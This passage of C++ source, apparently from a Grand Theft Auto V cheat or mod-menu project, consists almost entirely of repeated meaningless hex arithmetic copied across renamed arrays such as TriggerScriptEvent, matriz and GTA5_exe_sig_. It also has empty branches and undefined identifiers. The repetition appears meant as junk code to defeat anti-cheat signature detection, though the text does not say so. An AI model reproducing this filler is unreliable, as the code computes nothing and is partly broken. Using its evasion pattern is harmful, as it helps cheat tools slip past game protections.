					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				while (getline(tokenizer, token))
				{
					if (Extern_Reader::StringManager::SeContemTexto(token, "<X>"))
					{

						if (offset > aaaaaa)
						{
							matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
							matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
							matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
							matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							matriz[7] = (0xB1231 * 0xA) + matriz[2];
							a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
						}
						else
						{
							offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
							offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
							offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
							offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
						if (matriz[4] > 50.0f)
						{
							matriz[4] = matriz[1];
						}
						a2 = (matriz[4]) / (2 * matriz[2]);
						a1 = (matriz[3] + (2)) / (2 * matriz[2]);
						offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (matriz[3] + (5)) / (2 * matriz[2]);
						aaaaaa = ponteiro * 2;
						a = 0.0f;
						a1 = (matriz[3] + (4)) / (2 * matriz[2]);
						b = 0.0f;
						matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
						matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
						matriz[4] = matriz[1];
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
						offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						a2 = (matriz[4] + (2)) / (2 * matriz[2]);
						offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > aaaaaa)
						{
						}
						else
							a1 = (matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (matriz[4] - (3)) / (2 * matriz[2]);

						if (matriz[1] > aaaaaa)
						{
							matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
							matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
							matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
							matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
							matriz[7] = (0xB1231 * 0xA) + matriz[2];
							a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
						}
						else
						{
							matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
							matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
							matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
							matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
							matriz[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						}
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
						a = 0.0f;
						b = 0.0f;
						if (matriz[4] > 50.0f)
						{
							matriz[4] = matriz[1];
						}
						a2 = (matriz[4]) / (2 * matriz[2]);
						a1 = (matriz[3] + (2)) / (2 * matriz[2]);
						matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (matriz[3] + (5)) / (2 * matriz[2]);
						aaaaaa = 0xB2 * 2;
						a = 0.0f;
						a1 = (matriz[3] + (4)) / (2 * matriz[2]);
						b = 0.0f;
						matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
						matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
						matriz[4] = matriz[1];
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
						matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						a2 = (matriz[4] + (2)) / (2 * matriz[2]);
						matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						if (matriz[1] > aaaaaa)
						{
						}
						else
							a1 = (matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (matriz[4] - (3)) / (2 * matriz[2]);

						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
							a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
						}
						else
						{
							offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
							offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
							offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
						if (GTA5_exe_sig_[4] > 50.0f)
						{
							GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						}
						a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
						a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
						a = 0.0f;
						a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						b = 0.0f;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
						offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

						if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
							GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
							a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
						}
						else
						{
							GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
							GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						}
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
						a = 0.0f;
						b = 0.0f;
						if (GTA5_exe_sig_[4] > 50.0f)
						{
							GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						}
						a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
						a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
						a = 0.0f;
						a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						b = 0.0f;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
						GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
